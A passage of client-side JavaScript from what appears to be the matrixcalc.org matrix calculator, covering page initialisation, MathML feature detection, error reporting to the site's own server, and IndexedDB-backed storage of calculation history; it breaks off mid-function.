
    function main() {
      /*jslint plusplus: true, vars: true, indent: 2 */
/*global document, window */

(function () {
  "use strict";

  function PageUtils() {
  }

  PageUtils.on = function (eventType, selector, listener) {
    PageUtils.initialize(selector, function (element) {
      element.addEventListener(eventType, listener, false);
    });
  };

  PageUtils.escapeHTML = function (s) {
    return s.replace(/&/g, "&amp;")
            .replace(/"/g, "&quot;")
            .replace(/</g, "&lt;")
            .replace(/>/g, "&gt;");
  };

  PageUtils.$import = function (src) {
    //Note: "import" keyword cannot be used in IE 11
    return new Promise(function (resolve, reject) {
      var script = document.createElement("script");
      script.async = true;
      script.src = src;
      script.setAttribute("crossorigin", "anonymous");
      document.head.appendChild(script);
      script.onload = function () {
        resolve();
      };
      script.onerror = function () {
        reject();
      };
    });
  };

  var initializers = {className: {}, tagName: {}};

  var checkElement = function (element) {
    var tagName = element.tagName.toLowerCase();
    if (element.hasAttributes() || tagName === "details") { // for performance
      var initialized = element.getAttribute("data-i");
      if (initialized == undefined) {
        var callback = initializers.tagName[tagName];
        if (callback != undefined) {
          element.setAttribute("data-i", "1");
          callback(element);
        }
        var classList = element.classList;
        if (classList != undefined) { // <math> in IE 11, Opera 12 (during the check for MathML support)
          var classListLength = classList.length;
          if (classListLength !== 0) {
            element.setAttribute("data-i", "1");
            var t = 0;
            for (var k = 0; k < classListLength; k += 1) {
              var className = classList[k];
              var callback = initializers.className[className];
              if (callback != undefined) {
                if (t > 0) {
                  throw new TypeError(classList.toString());
                }
                t += 1;
                callback(element);
              }
            }
          }
        }
      }
    }
  };

  var intersectionObserver = globalThis.IntersectionObserver != null ? new IntersectionObserver(function (entries) {
    for (var i = 0; i < entries.length; i += 1) {
      if (entries[i].isIntersecting) {
        var e = entries[i].target;
        e.dispatchEvent(new Event('custom-paint', {bubbles: true}));
        intersectionObserver.unobserve(e);
      }
    }
  }) : null;
  //!Note: no need to unobserve detached elements according to https://github.com/w3c/IntersectionObserver/issues/474

  var checkCustomPaint = function (element) {
    if (element.getAttribute("data-custom-paint") != undefined) {
      if (intersectionObserver != null) {
        if (element.getAttribute("data-p") == undefined) {
          element.setAttribute("data-p", "1");
          intersectionObserver.observe(element);
        }
      } else {
        if (element.getAttribute("data-p") == undefined) {
          if (element.getBoundingClientRect().top !== 0) {
            element.setAttribute("data-p", "1");
            element.dispatchEvent(new Event('custom-paint', {bubbles: true}));
          }
        }
      }
    }
  };

  var checkSubtree = function (element) {
    var id = element.id;
    if (id !== 'insert-table-template' && id !== 'input-template') {//TODO: !?
      checkElement(element);
      var firstElementChild = element.firstElementChild;
      while (firstElementChild != undefined) {
        checkSubtree(firstElementChild);
        firstElementChild = firstElementChild.nextElementSibling;
      }
    }
  };

  var checkSubtree2 = function (element) {
    checkCustomPaint(element);
    var firstElementChild = element.firstElementChild;
    while (firstElementChild != undefined) {
      checkSubtree2(firstElementChild);
      firstElementChild = firstElementChild.nextElementSibling;
    }
  };

  // copy-pasted from MathML.js:
  var q = [];
  var queue = function (callback) {
    if (q.length === 0) {
      var c = function () {
        for (var i = 0; i < q.length; i += 1) {
          q[i]();
        }
        q.length = 0;
      };
      window.requestAnimationFrame(c);
    }
    q.push(callback);
  };

  var checkSubtree2Wrapper = function (element) {
    queue(function () {
      checkSubtree2(element);
    });
  };

  var started = false;

  PageUtils.initialize = function (selector, callback) {
    if (selector.startsWith(".")) {
      var className = selector.slice(1);
      if (started || initializers.className[className] != undefined) {
        throw new TypeError(className);
      }
      initializers.className[className] = callback;
    } else {
      initializers.tagName[selector] = callback;
    }
  };

  var observe = function () {
    if (!started) {
      started = true;
      // some initializers can modify DOM, so it is important to call `checkSubtree` after `observer.observe`
      checkSubtree(document.body);
      checkSubtree2Wrapper(document.body);
    }
  };

  var preObserve = function () {
    if (true) {
      // trying to initialize page earlier (before first paint (?))
      observe();
    }
    //loadI18n();
  };

  PageUtils.waitI18n = function (callback) {
    if (globalThis.i18n != null) {
      callback();
    } else {
      window.addEventListener('i18n-loaded', function (event) {
        callback();
      }, {once: true});
    }
  };
  
  // document.documentElement.lang === PageUtils.ROOT_SITE_LANG ? '.' : '..'
  PageUtils.ROOT_PATH = document.documentElement.getAttribute('data-root-path') || (document.currentScript.src.replace(/\?[\s\S]*/g, '') + '/..');

  var loadI18n = function () {
    var lang = document.documentElement.lang;
    //! the lang is set to iw-x-mtfrom-en at https://translate.googleusercontent.com/translate_c?depth=1&hl=iw&prev=search&rurl=translate.google.co.il&sl=en&u=https://matrixcalc.org/en/ - TODO - check
    if (lang.indexOf('-mtfrom-') !== -1) {
      lang = lang.slice(lang.indexOf('-mtfrom-') + '-mtfrom-'.length);
    }
    var i18nUrl = './i18n-' + lang + '.json' + (document.documentElement.getAttribute('data-version-tag') || '');
    // Use `cache: 'force-cache'` to workaround the issue, that Cache-Control is different for HTML/JS/CSS and JSON
    // As we have a version tag in the query string, it should be fine.
    fetch(i18nUrl, {credentials: 'same-origin', cache: 'force-cache'}).then(function (response) {
      return response.json();
    }).then(function (i18n) {
      globalThis.i18n = i18n;
      if (i18n.errors == null) {
        window.location.reload(true);//!
      }
      //observe();
      window.dispatchEvent(new Event('i18n-loaded')); // https://stackoverflow.com/a/42837595/839199
    });
  };
  loadI18n();

  function onDOMReady(event) {
    //TODO: remove
    var scriptVersion = '?20240126T105013Z';
    var htmlVersion = document.documentElement.getAttribute('data-version-tag') || scriptVersion;
    if ((scriptVersion !== htmlVersion) && (window.location.protocol === 'http:' || window.location.protocol === 'https:') && Object.keys != null && Object.keys(initializers).length !== 0 && window.fetch != null) {
      // a workaround for a caching bug in browsers
      // https://bugs.chromium.org/p/chromium/issues/detail?id=899752 - ?
      // Chrome/70
      // also there are some another error in Firefox, seems
      // Chrome - only for http: protocol, seems
      // Firefox - any protocol - ? (https:)
      fetch(window.location.href.replace(/^http\:/g, 'https:'), {cache: "reload"}).then(function (response) {
        return response.text();
      }).then(function (text) {
        var parser = new DOMParser();
        var doc = parser.parseFromString(text, "text/html");
        document.body.innerHTML = doc.body.innerHTML;
        preObserve();
      })["catch"](function () {
        preObserve();//!
      });
    } else {
      preObserve();
    }
  }
  
  if (document.readyState === "interactive" || document.readyState === "complete") {
    Promise.resolve(null).then(function () {
      onDOMReady(null);
    });
  } else {
    document.addEventListener("DOMContentLoaded", onDOMReady, {once: true});
  }

  // workaround for browsers, which do not support MutationObserver
  PageUtils.check = function (element) {
    checkSubtree(element);
    checkSubtree2Wrapper(element);
  };

  PageUtils.check1 = function (element) {
    checkSubtree(element);
    checkSubtree2Wrapper(element);
  };

  //Note: `Utils` is not a good name (somehow web clients may already have a variable with that name)
  globalThis.PageUtils = PageUtils;

}());

// Hello,
// Please, don't make a full clone of this application for wide publishing purposes.
// Some of the code is shared, some parts have their own license linked in the comments.
// If you need something, you may contact matri-tri-ca@yandex.ru.
// Have a nice day!

"use strict"; // It will be in the beginning of a mjs.js.
/*jslint sloppy: true, indent: 2 */
/*global XMLHttpRequest, window, Node */

(function (global) {
  "use strict";

  var encodeURIComponentSafe = function (string) {
    //return encodeURIComponent(String(string).replace(/[\u{D800}-\u{DFFF}]/gu, '\uFFFD'));
    return encodeURIComponent(String(string).replace(/([^\uD800-\uDBFF])[\uDC00-\uDFFF]/g, '$1\uFFFD').replace(/[\uD800-\uDBFF](?![\uDC00-\uDFFF])/g, '\uFFFD'));
  };

  var sent = {};
  global.onerror = function (message, filename, lineno, colno, error) {
    var data = "";
    data += "message=" + encodeURIComponentSafe(message || "") + "&";
    data += "filename=" + encodeURIComponentSafe(filename || "") + "&";
    data += "lineno=" + encodeURIComponentSafe(lineno || 0) + "&";
    data += "colno=" + encodeURIComponentSafe(colno || 0) + "&";
    data += "stack=" + encodeURIComponentSafe(error != undefined ? error.stack || "" : "");
    if (sent[data] == undefined && window.location.protocol !== "file:") {
      sent[data] = data;
      var xhr = new XMLHttpRequest();
      xhr.open("POST", "https://matrixcalc.mcdir.ru/jserrors.php?error=1", true);
      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
      xhr.send(data);
      if (error instanceof TypeError && lineno !== 1 && global.sendSnapshot != null) {
        global.sendSnapshot();
      }
    }
  };

}(self));


if (self.PerformanceObserver != null) {
  try {
    new PerformanceObserver(function (entryList) {
      var entries = entryList.getEntries();
      for (var i = 0; i < entries.length; i++) {
        var entry = entries[i];
        if (entry.interactionId) {
          console.log('Interaction:', entry.name, entry);
          var duration = entry.processingEnd - entry.startTime;
          if (duration > 1000 * 4) {
            var target = entry.target;
            window.onerror('Interaction:' + JSON.stringify(entry) + ':' + (target != null ? target.tagName + '.' + target.classList : ''));
            globalThis.sendSnapshot();
          }
        }
      }
    }).observe({
      type: 'event',
      buffered: true,
      durationThreshold: 512
    });
  } catch (error) {
    console.log(error);
  }
}




// Safari has no it
if (!window.requestIdleCallback) {
  window.requestIdleCallback = function (callback) {
    window.setTimeout(callback, 0);
  };
}

// IE, Edge, Firefox, Opera
if (!Element.prototype.scrollIntoViewIfNeeded) {
  Element.prototype.scrollIntoViewIfNeeded = function () {
    "use strict";
    // `centerIfNeeded` is not implemented
    var rect = this.getBoundingClientRect();
    if (rect.left < 0 || document.documentElement.clientWidth < rect.right ||
        rect.top < 0 || document.documentElement.clientHeight < rect.bottom) {
      this.scrollIntoView(document.documentElement.clientHeight < rect.bottom - rect.top || rect.top < 0);
    }
  };
}


  // layout work (?)
  var getMathMLSupport2 = function (callback) {
    var tmp = document.createElement("div");
    tmp.style.position = "fixed";
    tmp.style.top = "0px"; // affects layout root in Chrome
    tmp.style.left = "0px"; // affects layout root in Chrome
    tmp.style.whiteSpace = "nowrap";
    tmp.style.width = "0px";
    tmp.style.height = "0px";
    tmp.style.overflow = "hidden";
    tmp.style.visibility = "hidden";
    tmp.style.contain = "strict";//TODO: ?

    //! use long number to detect increase of the width:
    //! have to implement stretching for Chrome on Android: (no-stretchy-operators)
    //! Chrome bug : no-stretchy-macron - https://bugs.chromium.org/p/chromium/issues/detail?id=1409384#c4
    tmp.innerHTML = [
      '<math id="linebreaking-a" style="white-space: nowrap;"><mn>1</mn><mo>+</mo><mn>1</mn><mo>=</mo><mn>1</mn></math>',
      '<math id="linebreaking-b" style="white-space: normal;"><mn>1</mn><mo>+</mo><mn>1</mn><mo>=</mo><mn>1</mn></math>',
      '<math><mrow><mo id="stretchy-operators-a">(</mo><mtable><mtr><mtd><mn>0</mn></mtd></mtr><mtr><mtd><mn>0</mn></mtd></mtr><mtr><mtd><mn>0</mn></mtd></mtr></mtable><mo>)</mo></mrow></math>',
      '<math><mrow><mo id="stretchy-operators-b">(</mo><mi>X</mi><mo>)</mo></mrow></math>',
      '<math><mrow><mover accent="true"><mrow><mi>x</mi><mo>+</mo><mi>y</mi></mrow><mo id="stretchy-macron-a">¯</mo></mover></mrow></math>',
      '<math><mi>x</mi><mo id="stretchy-macron-b">+</mo><mi>y</mi></math>'
    ].join('');

    (document.getElementById("js-hidden-element") || document.body || document.documentElement).appendChild(tmp);

    return function () {
      var t = document.getElementById('stretchy-operators-a');
      // In IE the widths are almost equal
      var epsilon = 5e-5;
      
      var width = function (id) {
        return document.getElementById(id).getBoundingClientRect().width;
      };
      var height = function (id) {
        return document.getElementById(id).getBoundingClientRect().height;
      };
      
      window.requestIdleCallback(function () {
        window.requestAnimationFrame(function () {
          tmp.parentNode.removeChild(tmp);
        });
      });
      //TODO: !?
      return [(width('linebreaking-a') - width('linebreaking-b') > epsilon ? "" : "no-linebreaking"),
              (width('stretchy-macron-a') - width('stretchy-macron-b') > epsilon ? "" : "no-stretchy-macron"),
              (height('stretchy-operators-a') - height('stretchy-operators-b') > epsilon ? "" : "no-stretchy-operators"),
              (t.draggable != null ? "" : "no-draggable")];
    };
  };


// fix the bug with highlighting in dark mode

  function polyfillMathML() {
    window.setTimeout(function () {
      var mathmlSupport = getMathMLSupport2();
      //TODO: apply by default what Chrome has, unapply later
      window.requestAnimationFrame(function () {
        var c = window.opera != undefined ? 'no-draggable'.split(" ") : mathmlSupport();
        var classes = c;
        for (var i = 0; i < classes.length; i += 1) {
          if (classes[i] !== "") {
            document.body.classList.toggle(classes[i], true);
          }
        }
      });
    }, 500);
  }

  if (document.readyState === "interactive" || document.readyState === "complete") {
    polyfillMathML();
  } else {
    document.addEventListener("DOMContentLoaded", function (event) {
      polyfillMathML();
    }, {once: true});
  }

  document.addEventListener('animationstart', function (event) {
    if (event.animationName === 'mathmlAnimation') {
      var target = event.target;
      // ( ) | { }
      var c = target.textContent;
      if (target.matches('mo') && (c === '(' || c === ')' || c === '|' || c === '{' || c === '}')) {
        var fontSize = Number.parseFloat(window.getComputedStyle(target, null).fontSize);
        var height = target.parentNode.clientHeight; // Element#offsetHeight is not here in Chrome
        var scaleY = Math.max(height / fontSize - 0.1875, 0);
        if (scaleY === 0 || Math.abs(scaleY - 1) < 0.05) { // 0 when the element is not rendered
          scaleY = 1;
        }
        var scaleX = Math.sqrt(Math.sqrt(scaleY));
        window.requestAnimationFrame(function () {
          target.style.transform = 'scale(' + scaleX + ', ' + scaleY + ')';
        });
      }
    }
  });



if (!('webkitUserDrag' in document.documentElement.style)) {
  // I want to have focusable and draggable element, mrow[href="#"] can be used, but I need to prevent the navigation.
  var preventNavigation = function (event) {
    if (event.button === 0 || event.button === 1) {
      var target = event.target.closest('[href]');
      if (target != null && target.getAttribute('href') === '#') {
        event.preventDefault();
      }
    }
  };
  document.addEventListener("click", preventNavigation, false);
  document.addEventListener("auxclick", preventNavigation, false);

  // Firefox - works
  document.addEventListener('pointerdown', function (event) {//TODO: other events (?), check on Android
    var target = event.target.closest('[draggable]');
    if (target != null && target.tagName.toLowerCase() === 'mrow') {
      if (target.getAttribute('href') == null) {
        target.setAttribute('href', '#');
      }
    }
  });
}

// Alt key should switch dragging to text selection:
//!new 2019-11-13
if ('webkitUserDrag' in document.documentElement.style) {
  // no keydown for Alt in Opera!
  // autorepeat of Alt key does not work in Chrome and no way to get the Alt state(?)
  // It is too slow to toggle class on the document.body!
  // TODO:Caret Browsing mode needs user-select: text!
  window.addEventListener('mousedown', function (event) {
    var target = event.target.closest('[draggable]');
    var es = document.querySelectorAll('mrow[draggable]');
    for (var i = 0; i < es.length; i += 1) {
      es[i].setAttribute('draggable', event.altKey || target == null ? 'false' : 'true');
    }
    // setting draggable to false will hide the text selection in Chrome
  }, false);
} else {
  // Alt key works good in Firefox
  // change the cursor to text selection cursor for selection:
  var onKeyDownUp = function (event) {
    var DOM_VK_ALT = 18;
    if (event.keyCode === DOM_VK_ALT) {
      var es = document.querySelectorAll('mrow[draggable]');
      for (var i = 0; i < es.length; i += 1) {
        es[i].style.cursor = event.type === 'keydown' ? 'auto' : '';
      }
    }
  };
  window.addEventListener('keydown', onKeyDownUp, false);
  window.addEventListener('keyup', onKeyDownUp, false);
}

/*global window, console*/

(function () {
"use strict";

function IDBItemsStorage(fallbackItemsStorageLoad) {
  this.fallbackItemsStorageLoad = fallbackItemsStorageLoad;
}
IDBItemsStorage.prototype._ = function (operation, item, key, callback) {
  var fallbackItemsStorageLoad = this.fallbackItemsStorageLoad;
  var useFallback = function () {
    fallbackItemsStorageLoad(function (fallbackItemsStorage) {
      if (operation === "getAllEntries") {
        fallbackItemsStorage.getAllEntries(callback);
      }
      if (operation === "add") {
        fallbackItemsStorage.add(item, callback);
      }
      if (operation === "delete") {
        fallbackItemsStorage["delete"](key);
      }
      if (operation === "clear") {
        fallbackItemsStorage.clear();
      }
    });
  };
  var roundValue = function (value, max) {
    return "10**" + (Math.floor(Math.log(Math.max(value, max) + 0.5) / Math.log(10)) + 1);
  };
  var length = function (value) {
    var n = 0;
    if (value == undefined) {
      n += 8;
    } else if (typeof value === "boolean") {
      n += 8;
    } else if (typeof value === "number") {
      n += 8;
    } else if (typeof value === "string") {
      n += 16 + value.length;
    } else if (typeof value === "object") {
      if (value instanceof Array) {
        for (var j = 0; j < value.length; j += 1) {
          n += length(value[j]);
        }
      } else {
        for (var i in value) {
          if (Object.prototype.hasOwnProperty.call(value, i)) {
            n += length(value[i]);
          }
        }
      }
    }
    return n;
  };
  var handleQuotaExceeded = function (db, item, callback) {
    // delete some old records + repeat
    // `getAllKeys` is used to carefully work with multiple concurrent calls
    var transaction1 = db.transaction("items", "readonly");
    var store1 = transaction1.objectStore("items");
    store1.getAllKeys().onsuccess = function (event) {
      var keys = event.target.result;
      var n = keys.length;
      var slowAdd = function (divisor) {
        var transaction2 = db.transaction("items", "readwrite");
        var store2 = transaction2.objectStore("items");
        transaction2.onabort = function (event) {
          console.log(event.target.error); // Chrome shows nothing in the Console
          if (event.target.error != null && event.target.error.name === "QuotaExceededError" && n >= divisor) {
            slowAdd(divisor * 2);
          } else {
            db.close();
          }
        };
        for (var i = 0; i < n - Math.floor(n / divisor); i += 1) {
          store2["delete"](keys[i]);
        }
        store2.add(item).onsuccess = function (event) {
          var key = event.target.result;
          transaction2.oncomplete = function (event) {
            db.close();
            callback(key);
          };
        };
      };
      transaction1.oncomplete = function (event) {
        slowAdd(1);
      };
    };
    transaction1.onabort = function (event) {
      console.log(event.target.error); // Chrome shows nothing in the Console
      db.close();
    };
  };
  var onOpen = function (db) {
    onEvent("access", "successful", undefined);
    // Note: it may throw a NotFoundError
    var transaction = db.transaction("items", operation === "getAllEntries" ? "readonly" : "readwrite");
    var store = transaction.objectStore("items");
    // Looks like "abort" is fired for QuotaExceededError
    transaction.onabort = function (event) {
      // TypeError: null is not an object (evaluating 'event.target.error.name') - https://matrixcalc.org/slu.html
      // Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1
      onEvent(operation, event.target.error != null ? event.target.error.name : null, item);
      console.log(event.target.error); // Chrome shows nothing in the Console
      if (operation === "add") {
        if (event.target.error != null && event.target.error.name === "QuotaExceededError") {
          handleQuotaExceeded(db, item, callback);
        } else {
          db.close();
        }
      } else {
        db.close();
        if (operation === "getAllEntries") {
          callback({keys: [], items: []});
        }
      }
    };
    if (operation === "getAllEntries") {
      store.getAllKeys().onsuccess = function (event) {
        var keys = event.target.result;
        store.getAll().onsuccess = function (event) {
          var items = event.target.result;
          transaction.oncomplete = function (event) {
            onEvent(operation, "successful", {keys: keys, items: items});
            db.close();
            callback({keys: keys, items: items});
          };
        };
      };
    } else if (operation === "add") {
      store.add(item).onsuccess = function (event) {
        var key = event.target.result;
        transaction.oncomplete = function (event) {
          onEvent(operation, "successful", item);
          db.close();
          callback(key);
        };
      };
    } else if (operation === "delete") {
      store["delete"](key);
      db.close();
    } else if (operation === "clear") {
      store.clear();
      db.close();
      //TODO: REMOVE
      try {
        var s = window.localStorage;
        if (s) {
          s.removeItem("resdiv");
        }
      } catch (error) {
        console.error(error);
      }
      //if (fallbackItemsStorage != null) {
      //  fallbackItemsStorage.clear(); //TODO: remove
      //}
    }
  };
  var start = Date.now();
  var onEvent = function (operation, errorName, value) {
    var tmp = {};
    tmp[operation] = {ok: errorName, duration: roundValue(Date.now() - start, 100 - 1), valueLength: roundValue(length(value), 1000 - 1)};
    hit({idb: tmp});
  };
  var indexedDB = undefined;
  var wasError = false;
  try {
    indexedDB = window.indexedDB;
  } catch (error) {
    wasError = true;
    // "Cookies blocking in Firefox" - https://github.com/Modernizr/Modernizr/issues/1825#issuecomment-171087703
    onEvent("access", error.name, undefined);
    console.log(error);
    useFallback();
  }
  if (!wasError &&
      indexedDB != undefined) {
    var openRequest = undefined;
    try {
      openRequest = indexedDB.open("acthistory");
    } catch (error) {
      // "SecurityError" for opaque origins
      onEvent("access", error.name, undefined);
      console.log(error);
      useFallback();
    }
    if (openRequest != undefined) {
      openRequest.onupgradeneeded = function (event) {
        var db = event.target.result;
        if (db == null) {
          // Mozilla/5.0 (Linux; U; Android 9; ru-ru; Redmi Note 5 Build/PKQ1.180904.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36 XiaoMi/MiuiBrowser/11.3.4-g
          window.onerror('TypeError: db is null, ' + (openRequest.result == null) + ' ' + (event.target === openRequest));//TODO: remove
          useFallback();
        }
        //Note: as the version was not provided, the object store should not exist at this point.
        var store = db.createObjectStore("items", {
          //keyPath: undefined, // IE 11 throws an InvalidAccessError for undefined or null
          autoIncrement: true
        });
        //! fallbackItemsStorage should be synchronous
        var x = (localStorage.getItem('resdiv') || '[]') !== '[]' || /(?:^|;)\s*lastResult\s*\=\s*([^;]*)/.test(document.cookie);
        if (x) {
          openRequest.transaction.abort();
          useFallback();
          //for (var i = 0; i < items.length; i += 1) {
          //  store.add(items[i]);
          //}
        }
        //TODO: fallbackItemsStorage.clear()
      };
      //Note: this will handle abort of `openRequest.transaction` or an error during creation of a new database (step 5.1.6)
      openRequest.onerror = function (event) {
        onEvent("access", event.target.error != null ? event.target.error.name : null, undefined);
        console.log(event.target.error);
        useFallback();
        event.preventDefault();// FireFox 52 - 57
      };
      openRequest.onsuccess = function (event) {
        var db = event.target.result;
        if (!db.objectStoreNames.contains("items")) {
          onEvent("access", "No store", undefined);
          console.log("No store");
          if (operation === "getAllEntries") {
            callback({keys: [], items: []});
          }
        } else {
          onOpen(db);
        }
      };
    }
  } else if (!wasError) {
    onEvent("access", "No indexedDB", undefined);
    console.log("No indexedDB");
    useFallback();
  }
};
IDBItemsStorage.prototype.getAllEntries = function (callback) {
  this._("getAllEntries", undefined, undefined, callback);
};
IDBItemsStorage.prototype.add = function (item, callback) {
  this._("add", item, undefined, callback);
};
IDBItemsStorage.prototype["delete"] = function (key) {
  this._("delete", undefined, key, undefined);
};
IDBItemsStorage.prototype.clear = function () {
  this._("clear", undefined, undefined, undefined);
};

globalThis.IDBItemsStorage = IDBItemsStorage;
}());

/*global ItemsStorage */

(function () {
"use strict";

var td = globalThis.TextDecoder != null ? new TextDecoder() : null;
var te = globalThis.TextEncoder != null ? new TextEncoder() : null;
var forceOneByte = function (s) {
  if (td == null || te == null) {
    return s;
  }
  return td.decode(te.encode(s));
};

var compress = function (html) {
  // make string ASCII-only
  var s = html.replace(/[\u0080-\uD7FF\uE000-\uFFFF]/g, function (s) {
    return '&#x' + ('0000' + s.charCodeAt(0).toString(16).toUpperCase()).slice(-4) + ';';
  });
  //TODO: pairs and invalid chars
  return forceOneByte(s);
};

ActHistoryStorage.createItem = function createItem(data) {
  //var oldVersion = data.version || 0;
  //if (oldVersion < ActHistoryStorage.itemVersion) {
  //  data = ItemsStorage.updateItem(data);
  //}
  //this.oldVersion = oldVersion;
  return {
    resultHTML: compress(data.resultHTML || ""),
    resultMatrix: data.resultMatrix || "",
    details: data.details,
    expressionString: data.expressionString,
    actHistoryId: data.actHistoryId,
    detailsHTML: compress(data.detailsHTML || ""),
    version: data.version,
    timestamp: data.timestamp
  };
}

ActHistoryStorage.itemVersion = 22;

function ActHistoryStorage(itemsStorage) {
  this.itemsStorage = itemsStorage;
  this.actHistory = {};
  this.actHistoryId = 0;
}
ActHistoryStorage.prototype.load = function (callback) {
  this.itemsStorage.getAllEntries(function (tmp) {
    var keys = tmp.keys;
    var items = tmp.items;

    var needsUpdate = false;
    for (var i = 0; i < items.length; i += 1) {
      var key = keys[i];
      var item = items[i];
      if (item != null && item.version < ActHistoryStorage.itemVersion) {
        needsUpdate = true;
      }
    }
    //TODO: remove waitExpression
    var f = needsUpdate ? globalThis.waitExpression : function (c) { return function () { c(); }; };

    f(function () {
    this.actHistory = {};
    for (var i = 0; i < items.length; i += 1) {
      var key = keys[i];
      var item = items[i];
      if (item != null) { //! some strange issue in Safari
        if (item.version < ActHistoryStorage.itemVersion) {
          item = ItemsStorage.updateItem(item);
        }
        this.actHistory[key] = {item: item, key: key};
        this.actHistoryId = Math.max(this.actHistoryId, key);
      }
    }
    callback(this.actHistory);
    }.bind(this))();
  }.bind(this));
};
ActHistoryStorage.prototype.getPreviousItem = function () {
  var previousItem = undefined;
  for (var i in this.actHistory) {
    if (Object.prototype.hasOwnProperty.call(this.actHistory, i)) { // TODO: iteration order - ?
      if (this.actHistory[i] != undefined) {
        previousItem = this.actHistory[i].item;
      }
    }
  }
  return previousItem;
};
ActHistoryStorage.prototype.size = function () {
  var size = 0;
  for (var i in this.actHistory) {
    if (Object.prototype.hasOwnProperty.call(this.actHistory, i)) {
      if (this.actHistory[i] != undefined) {
        size += 1;
      }
    }
  }
  return size;
};
ActHistoryStorage.prototype.getItem = function (actHistoryId) {
  var x = this.actHistory[actHistoryId];
  return x == undefined ? undefined : x.item;
};
ActHistoryStorage.prototype.setItem = function (actHistoryId, item) {
  this.actHistory[actHistoryId] = {item: item, key: undefined};
  this.itemsStorage.add(item, function (key) {
    this.actHistoryId = Math.max(this.actHistoryId, key);
    if (this.actHistory[actHistoryId] != undefined) {
      this.actHistory[actHistoryId] = {item: item, key: key};
    } else {
      this.itemsStorage["delete"](key);
    }
  }.bind(this));
};
ActHistoryStorage.prototype.removeItem = function (actHistoryId) {
  var key = this.actHistory[actHistoryId].key;
  if (key != undefined) {
    this.itemsStorage["delete"](key);
  }
  delete this.actHistory[actHistoryId];
};
ActHistoryStorage.prototype.clear = function () {
  this.itemsStorage.clear();
  this.actHistory = {};
};

ActHistoryStorage.prototype.getActHistory = function () {
  return Object.assign({}, this.actHistory);
};

globalThis.ActHistoryStorage = ActHistoryStorage; //!

}());

/*global window, document, unescape, hit, Node */

// deprecated

(function () {
"use strict";

function ItemsStorage(keyStorage) {
  this.keyStorage = keyStorage;
}
ItemsStorage.prototype._save = function (items) {
  var data = Array.from(items).filter(function (x) { return x != undefined; });
  var keyStorage = this.keyStorage;
  var save = function (limit) {
    data = data.slice(Math.max(0, data.length - limit));
    var valueToSave = JSON.stringify(data);
    keyStorage.setItem("resdiv", valueToSave);
    var value = keyStorage.getItem("resdiv");
    if (value !== valueToSave && limit > 1 && valueToSave.length > 4 * 1024) {
      return save(Math.floor(limit / 2));
    }
    return undefined;
  };
  return save(data.length);
};
ItemsStorage.prototype._load = function () {
  var parseJSONArraySafely = function (value) {
    try {
      // old data ?
      var result = JSON.parse(value);
      if (result instanceof Array) {
        return result;
      }
    } catch (error) {
      console.error(error);
    }
    return [];
  };
  var value = this.keyStorage.getItem("resdiv") || "[]";
  var items = parseJSONArraySafely(value);

  try {
    var m = /(?:^|;)\s*lastResult\s*\=\s*([^;]*)/.exec(document.cookie);
    if (m != undefined) {
      var lastResult = unescape(m[1]);
      if (lastResult !== "") {
        window.setTimeout(function () {
          hit({bc: "cookie"});
        }, 0);
        items.unshift([lastResult]);
        var valueToSave = JSON.stringify(items);
        this.keyStorage.setItem("resdiv", valueToSave);
        if (this.keyStorage.getItem("resdiv") === valueToSave) {
          document.cookie = "lastResult=; expires=Thu, 01 Jan 1970 00:00:00 GMT";
        }
      }
    }
  } catch (error) {
    window.setTimeout(function () {
      throw error;
    }, 0);
  }

  var currentNumber = 0;
  for (var i = 0; i < items.length; i += 1) {
    items[i] = ItemsStorage.updateVersion0(items[i], currentNumber + 1);
    currentNumber = Math.max(currentNumber, items[i].actHistoryId);
  }
  return {
    items: items,
    currentNumber: currentNumber
  };
};
ItemsStorage.prototype.getAllEntries = function (callback) {
  var tmp = this._load();
  var items = tmp.items;
  var keys = items.map(function (item) { return item.actHistoryId; });
  callback({keys: keys, items: items});
};
ItemsStorage.prototype.add = function (item, callback) {
  var tmp = this._load();
  var items = tmp.items;
  var currentNumber = tmp.currentNumber;
  var key = currentNumber + 1;
  item.actHistoryId = key;
  items.push(item);
  this._save(items);
  callback(key);
};
ItemsStorage.prototype["delete"] = function (key) {
  var tmp = this._load();
  var items = tmp.items;
  for (var i = 0; i < items.length; i += 1) {
    var x = items[i];
    if (x != undefined && x.actHistoryId === key) {
      items[i] = undefined;
    }
  }
  this._save(items);
};
ItemsStorage.prototype.clear = function () {
  this._save([]);
};


ItemsStorage.updateVersion0 = function (data, idIfNotSet) {
  var oldVersion = data.version || 0;
  if (oldVersion === 0) {
    data = Array.from(data);
    while (data.length < 6) {
      data.push(undefined);
    }
    // emptry strings are needed for `zInsAct`
    var resultHTML = data[0] || "";
    if (resultHTML.indexOf("</custom-math>") === -1 && resultHTML.indexOf("</math>") === -1) {
      resultHTML = "<div class=\"math\">" + resultHTML + "</div>";
    }
    var resultMatrix = data[1] || "";
    data = {
      resultHTML: resultHTML,
      resultMatrix: resultMatrix,
      details: data[2],
      expressionString: data[3],
      actHistoryId: data[4] != undefined ? Number(data[4]) : idIfNotSet,
      detailsHTML: data[5],
      version: 7
    };
  }
  return data;
};

ItemsStorage.updateItem = function (data) {

  var oldVersion = data.version || 0;
  
  data = ItemsStorage.updateVersion0(data);

  if (oldVersion <= 7) {
    if (data.resultMatrix != undefined && data.resultMatrix.indexOf(";") !== -1) {
      // "-17/3\t 4\t 4/3;  8/3\t-2\t-1/3;   -2\t 1\t   1"
      data.resultMatrix = "{{" + data.resultMatrix.replace(/\s*;\s*/g, "},{").replace(/\t/g, ",").replace(/\x20/g, "") + "}}";
      hit({bc: "resultMatrix"});//!
    }
  }

  if (data.resultMatrix === '') {
    var tmp = /onclick\="\(new Matrix\('str',\d+,(\d+)(?:,\d+)?,([\-0-9\/',]+)\)\).print\('a'\);">/.exec(data.resultHTML);
    if (tmp != null) {
      var colsNumber = Number(tmp[1]);
      var rows = [];
      var x = tmp[2].replace(/'/g, '').split(',');
      while (x.length !== 0) {
        rows.push('{' + x.slice(0, colsNumber).join(',') + '}');
        x = x.slice(colsNumber);
      }
      data.resultMatrix = '{' + rows.join(',') + '}';
    }
  }

  if (true) {
    var removeInsertButtons = function (e) {
      var spans = e.querySelectorAll('span');
      for (var i = 0; i < spans.length; i += 1) {
        var span = spans[i];
        if (span.style != null && span.style.cssFloat === 'right') {
